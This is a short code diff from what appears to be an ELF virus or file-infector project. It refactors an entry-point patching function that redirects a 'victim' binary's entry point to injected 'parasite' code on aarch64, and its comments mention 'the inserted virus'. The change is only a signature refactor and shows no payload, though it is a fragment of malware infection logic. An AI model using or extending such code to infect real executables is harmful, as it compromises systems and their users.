@@ -2,10 +2,10 @@
 
 namespace vt::redirection {
 
-bool patch_entry_point(Elf64_Addr parasite_entry_address,
-                       Elf64_Off parasite_file_offset,
-                       Elf64_Off patch_offset_from_parasite_start,
-                       std::span<std::byte> victim) {
+bool EntryPointPatcher::operator()(Elf64_Addr parasite_entry_address,
+                                   Elf64_Off parasite_file_offset,
+                                   Elf64_Off patch_offset_from_parasite_start,
+                                   std::span<std::byte> victim) {
   // constexpr uint32_t no_op_to_be_patched = 0x11223344;
   //  For aarch64, patch the b address to the orignal entry point.
   //  It is assumed that the inserted virus has at least 4 bytes of noop and
